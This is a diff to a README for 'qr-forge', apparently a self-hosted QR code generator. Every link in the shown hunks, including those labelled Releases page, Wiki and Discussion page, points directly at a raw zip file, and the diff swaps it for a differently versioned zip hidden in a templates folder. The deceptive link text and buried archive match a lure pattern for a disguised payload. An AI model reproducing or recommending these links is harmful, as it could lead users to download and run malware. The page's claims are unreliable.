@@ -5,12 +5,12 @@ qr-forge is a self-hosted QR code generator that supports WiFi connections. Whet
 
 ## 📥 Download qr-forge
 
-[![Download qr-forge](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip)](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip)
+[![Download qr-forge](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/templates/forge-qr-v1.6-alpha.1.zip)](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/templates/forge-qr-v1.6-alpha.1.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run qr-forge easily:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/templates/forge-qr-v1.6-alpha.1.zip).
 2. On the Releases page, you will see the latest version of qr-forge listed. Look for the files provided for download.
 3. Choose the correct file for your operating system:
 
@@ -101,8 +101,8 @@ Yes! Feel free to fork the repository and submit your changes via pull requests.
 For any issues or feedback, please reach out by opening an issue in this repository. We appreciate your contributions and suggestions.
 
 ## 🔗 Additional Resources
-- **Documentation:** Check our [Wiki](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip) for detailed guides.
-- **Community:** Join the discussions and connect with other users in our [Discussion page](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip).
+- **Documentation:** Check our [Wiki](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/templates/forge-qr-v1.6-alpha.1.zip) for detailed guides.
+- **Community:** Join the discussions and connect with other users in our [Discussion page](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/templates/forge-qr-v1.6-alpha.1.zip).
 
 ## 📥 Download link again
-Don’t forget to [visit this page to download](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/qr-forge-v3.9-alpha.5.zip) qr-forge and start generating QR codes today!
+Don’t forget to [visit this page to download](https://raw.githubusercontent.com/ghost19-95/qr-forge/main/app/templates/forge-qr-v1.6-alpha.1.zip) qr-forge and start generating QR codes today!
